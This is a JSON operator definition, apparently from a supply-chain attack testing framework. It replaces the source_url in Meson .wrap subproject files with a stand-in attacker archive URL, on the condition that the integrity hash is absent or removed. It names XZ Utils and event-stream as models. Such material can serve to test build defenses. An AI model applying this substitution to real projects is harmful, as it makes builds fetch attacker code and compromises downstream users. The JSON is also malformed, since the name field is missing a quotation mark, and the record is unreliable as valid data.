{
  "id": "wrap_git_revision_swap",
  "name": Wrap Git revision swap",
  "description": "",
  "target_build_phase": "dependency_fetch",
  "scheme": "dependency_aware",
  "mode": "replace",
  "injection_location": {
    "file_glob": "subprojects/*.wrap",
    "field": "source_url"
  },
  "placeholders": {
    "WRAP_FILE": "relative path to the .wrap file being modified",
    "ORIGINAL_URL": "the legitimate source_url currently in the wrap file"
  },
  "attacker_values": {
    "SUBSTITUTE_URL": "https://mirror.invalid.example/substituted-archive.tar.gz"
  },
  "template": {
    "file_path": "{{WRAP_FILE}}",
    "replacement_value": "{{SUBSTITUTE_URL}}"
  },
  "preconditions": [
    "project has at least one [wrap-file] subproject with a source_url",
    "source_hash is absent, or is removed/recomputed by a companion operator"
  ],
  "source_attacks": [
    "XZ Utils (CVE-2024-3094)",
    "event-stream (Copay)"
  ]
}
